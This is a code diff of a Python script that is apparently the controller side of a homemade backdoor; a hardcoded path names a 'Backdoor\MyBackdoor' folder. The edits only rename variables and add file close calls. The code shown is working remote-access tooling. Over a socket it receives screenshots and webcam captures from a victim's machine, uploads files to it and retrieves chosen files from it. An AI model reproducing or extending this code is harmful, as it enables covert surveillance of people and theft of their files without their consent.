@@ -70,18 +70,19 @@ while True:
             image.write(imageByte)
         os.replace(localPath+"\\"+strRandomNumber+".png",localPath+"\\Screenshots\\{}"
         .format(strRandomNumber+".png"))
+        image.close()
 
     elif first == "3":
         connection(3)
-        FileByte = conn.recv(4096*4096)
-        if FileByte == b"camera is not used:.":
+        fileByte = conn.recv(4096*4096)
+        if fileByte == b"camera is not used:.":
             print("\nCamera is not used:.")
         else:
             randomCamera = randint(0,100000)
             strRandomCamera = str(randomCamera)
-            with open(strRandomCamera+".png","wb") as CameraImageFile:
-                CameraImageFile.write(FileByte)
-            CameraImageFile.close()
+            with open(strRandomCamera+".png","wb") as cameraImageFile:
+                cameraImageFile.write(fileByte)
+            cameraImageFile.close()
 
             os.replace(localPath+"\\"+strRandomCamera+".png","C:\\Users\\berat\\Desktop\\desktop\\Backdoor\\MyBackdoor\\Camera\\{}"
             .format(strRandomCamera+".png"))
@@ -103,35 +104,35 @@ while True:
     elif first == "7":
         connection(7)
 
-        SendFile = str(input("Enter the name of the file: "))
+        sendFile = str(input("Enter the name of the file: "))
 
-        extension = SendFile.split(".")[1]
+        extension = sendFile.split(".")[1]
         conn.send(extension.encode()) #[0][1]
             
-        with open(SendFile, 'rb') as binaryFiles:
-            BinaryFile = binaryFiles.read()
-            binaryFiles.close()
+        with open(sendFile, 'rb') as binaryFiles:
+            binaryFile = binaryFiles.read()
+        binaryFiles.close()
 
-        conn.send(BinaryFile) #[1][1]
+        conn.send(binaryFile) #[1][1]
     elif first == "8":
         connection(8)
         getFile = str(input("Enter get file path: "))
-        GetFileExtension = getFile.split(".")[1]
-        ByteGetFile = getFile.encode()
-        conn.send(ByteGetFile)
+        getFileExtension = getFile.split(".")[1]
+        byteGetFile = getFile.encode()
+        conn.send(byteGetFile)
 
-        ByteGetFile = conn.recv(4096*4096)
+        byteGetFile = conn.recv(4096*4096)
         randomName = randint(0,10000)
         stringRandomName = str(randomName)
-        FileName = stringRandomName+"."+GetFileExtension
+        fileName = stringRandomName+"."+getFileExtension
         try:
             os.mkdir("GetFiles")
         except FileExistsError:
             pass
-        with open(FileName,"wb") as writeGetFile:
-            writeGetFile.write(ByteGetFile)
-            writeGetFile.close()
+        with open(fileName,"wb") as writeGetFile:
+            writeGetFile.write(byteGetFile)
+        writeGetFile.close()
         
-        GetFilePath = os.getcwd()
-        os.replace(GetFilePath+"\\"+stringRandomName+"."+GetFileExtension,GetFilePath+
-                                        "\\GetFiles\\"+stringRandomName+"."+GetFileExtension)
+        getFilePath = os.getcwd()
+        os.replace(getFilePath+"\\"+stringRandomName+"."+getFileExtension,getFilePath+
+                                        "\\GetFiles\\"+stringRandomName+"."+getFileExtension)
